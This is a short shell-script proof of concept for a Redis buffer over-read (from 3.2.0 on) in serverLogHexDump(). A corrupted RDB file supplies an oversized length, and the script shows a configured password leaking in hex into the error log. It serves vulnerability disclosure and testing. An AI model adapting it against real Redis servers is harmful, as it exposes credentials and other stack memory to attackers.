# Date: Sept 06, 2016
# Vulnerability type: CWE-126: Buffer Over Read
# Description: The last parameter named len in serverLogHexDump() can be controled by a curruption rdb database file. A very large value will triger a buffer over read, resulting sensitve information on the stack exposed.
# Affected Version: >=redis 3.2.0
# Debian version: stretch and sid

Redis_Path=`which redis-server`
PASS_WORD='AAAA__PASSWORD__PASSWORD__AAAA'
HEX_PASS='414141415f5f50415353574f52445f5f50415353574f52445f5f41414141'
DB_FILE='buffer_over_read.rdb'
LOG_FILE='error.log'
echo "Redis Version:"
$Redis_Path --version

#sets a password and loads a rdb file
$Redis_Path --requirepass $PASS_WORD --port 54321 --dbfilename $DB_FILE > $LOG_FILE 
#search password
echo "The password $PASS_WORD will be found in the $LOG_FILE with hex format: $HEX_PASS"
#cat $LOG_FILE | grep -n $HEX_PASS
